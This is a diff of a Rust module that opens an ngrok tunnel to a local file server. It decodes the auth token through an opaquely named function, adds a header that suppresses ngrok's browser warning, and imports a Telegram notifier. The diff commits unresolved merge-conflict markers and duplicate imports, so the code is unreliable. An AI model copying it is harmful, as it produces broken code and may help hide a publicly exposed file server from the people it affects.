@@ -2,20 +2,40 @@ use crate::config::Config;
 use crate::encryption::aa27;
 use crate::notification::{TelegramNotifier, NotificationSystem};
 use log::{info, error};
+<<<<<<< Updated upstream
 use tokio::time::{sleep, Duration};
 use url::Url;
 use ngrok::config::ForwarderBuilder;
 use ngrok::tunnel::{EndpointInfo, TunnelInfo};
+=======
+use {
+    crate::config::Config,
+    crate::encryption::aa27,
+    tokio::time::{sleep, Duration},
+    url::Url,
+};
+>>>>>>> Stashed changes
+
+use ngrok::config::ForwarderBuilder;
+use ngrok::tunnel::{EndpointInfo, TunnelInfo};
 
 /// Main function to set up ngrok tunnel using the official SDK
+<<<<<<< Updated upstream
 pub async fn setup_ngrok_tunnel(port: u16) -> String {
+=======
+pub async fn setup_ngrok_tunnel(_port: u16) -> String {
+>>>>>>> Stashed changes
     // Get auth token from config
     let config = Config::new();
     let auth_token = aa27(config.na.clone());
     
+<<<<<<< Updated upstream
     // Use the dynamically allocated port that was passed in
     
     info!("Setting up ngrok tunnel for port {}", port);
+=======
+    info!("Setting up ngrok tunnel for port {}", _port);
+>>>>>>> Stashed changes
     
     // Connect to ngrok service directly with the auth token
     let session = match ngrok::Session::builder()
@@ -42,6 +62,7 @@ pub async fn setup_ngrok_tunnel(port: u16) -> String {
         .http_endpoint()
         .forwards_to(Url::parse(&local_url).unwrap())
         .metadata("zlt-file-server")
+        .request_header("ngrok-skip-browser-warning", "true")
         .listen_and_forward(Url::parse(&local_url).unwrap())
         .await;
     
